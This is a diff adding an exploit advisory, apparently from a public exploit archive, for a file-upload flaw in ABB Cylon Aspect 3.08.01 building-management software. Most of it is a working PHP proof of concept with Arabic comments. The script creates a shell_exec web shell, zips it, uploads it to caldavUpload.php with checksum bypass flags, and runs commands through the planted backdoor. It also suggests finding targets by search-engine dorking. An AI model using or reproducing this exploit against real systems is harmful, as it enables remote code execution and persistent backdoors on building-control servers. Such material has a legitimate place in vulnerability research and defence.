@@ -1,0 +1,86 @@
+=============================================================================================================================================
+| # Title     : ABB Cylon Aspect 3.08.01 shell upload                                                                                       |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 10 Fr(Pro) / browser : Mozilla firefox 136.0.0 (64 bits)                                                            |
+| # Vendor    : https://global.abb/group/en                                                                                                 |
+=============================================================================================================================================
+
+POC :
+
+[+] Dorking İn Google Or Other Search Enggine.
+
+[+] Code Description: Script to exploit file upload vulnerability in ABB Cylon Aspect 3.08.01 Allows you to upload a PHP file and execute it on the target server.
+
+    (Related : https://packetstorm.news/files/id/189617/ Related CVE numbers:  ) .
+	
+[+] save code as poc.php.
+
+[+] Usage : php poc.php 
+
+[+] PayLoad :
+
+<?php
+
+// سكربت لاستغلال ثغرة رفع الملفات في ABB Cylon Aspect 3.08.01
+// يسمح برفع ملف PHP وتنفيذه على السيرفر المستهدف
+
+$target_url = "http://192.168.73.31/caldavUpload.php";
+$backdoor_path = "baikal/html/indoushka.php";
+$zip_file = "baikal-0.6.1.zip";
+
+// إنشاء باك دور بسيط
+$backdoor = "<?php echo shell_exec(\$_GET['cmd']); ?>";
+file_put_contents("indoushka.php", $backdoor);
+
+// ضغط الباك دور في ملف ZIP
+$zip = new ZipArchive();
+if ($zip->open($zip_file, ZipArchive::CREATE) === TRUE) {
+    $zip->addFile("indoushka.php", $backdoor_path);
+    $zip->close();
+    echo "[+] تم إنشاء ملف ZIP يحتوي على الباك دور.\n";
+} else {
+    die("[-] فشل في إنشاء ملف ZIP.\n");
+}
+
+// رفع الملف إلى السيرفر
+$post_data = [
+    'baikalFile' => new CURLFile($zip_file),
+    'skipChecksum' => '1',
+    'EXPERTMODE' => '1'
+];
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $target_url);
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+$response = curl_exec($ch);
+curl_close($ch);
+
+if (strpos($response, "Baikal Bundle Uploaded and Extracted - OK") !== false) {
+    echo "[+] تم رفع الباك دور بنجاح!\n";
+} else {
+    die("[-] فشل في رفع الباك دور.\n");
+}
+
+// تنفيذ أوامر من خلال الباك دور
+$backdoor_url = "http://192.168.73.31/baikal/html/indoushka.php";
+$cmd = "id";
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $backdoor_url);
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, ['cmd' => $cmd]);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$response = curl_exec($ch);
+curl_close($ch);
+
+echo "[+] استجابة الباك دور:\n$response\n";
+
+?>
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
